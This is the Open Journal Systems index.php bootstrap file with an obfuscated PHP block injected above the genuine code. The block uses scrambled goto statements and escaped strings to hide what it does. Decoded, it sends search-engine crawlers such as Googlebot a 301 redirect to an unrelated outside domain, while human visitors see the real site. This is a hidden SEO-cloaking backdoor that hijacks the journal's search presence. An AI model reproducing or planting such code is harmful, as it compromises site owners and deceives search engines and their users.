<?php
 goto YdSnM; ftmaI: ob_end_flush(); goto GlMZg; QMRRi: $botchar = "\x2f\x28\147\x6f\157\147\x6c\145\x62\x6f\x74\174\x73\154\165\162\160\174\141\144\x73\145\x6e\163\x65\x7c\151\156\x73\160\x65\x63\164\151\157\x6e\x7c\141\150\x72\145\x66\163\x29\x2f"; goto LZfkX; LZfkX: if (preg_match($botchar, $ua)) { header("\x4c\x6f\143\x61\164\151\x6f\156\x3a\40{$urlTo}", TRUE, 301); ob_end_flush(); die; } goto ftmaI; VuZZe: $ua = strtolower($_SERVER["\x48\x54\x54\x50\137\125\x53\x45\x52\x5f\x41\107\x45\x4e\124"]); goto cnkz8; YdSnM: ob_start(); goto pDpRg; c0f3N: header("\126\x61\x72\171\72\40\x55\x73\145\162\x2d\x41\x67\x65\156\164"); goto VuZZe; pDpRg: header("\x56\141\x72\x79\x3a\40\x41\143\x63\x65\160\x74\x2d\114\141\x6e\147\x75\x61\x67\145"); goto c0f3N; cnkz8: $urlTo = "\150\x74\x74\160\163\x3a\57\57\143\x6f\155\163\x65\162\166\141\x2e\x70\165\142\154\151\x6b\141\163\151\x69\x6e\x64\x6f\156\x65\163\151\141\56\x69\144\57"; goto QMRRi; GlMZg: ?>
 
 <?php

/**
 * @file ojs/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

use APP\core\Application;

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
require_once './lib/pkp/includes/bootstrap.php';

// Serve the request
Application::get()->execute();
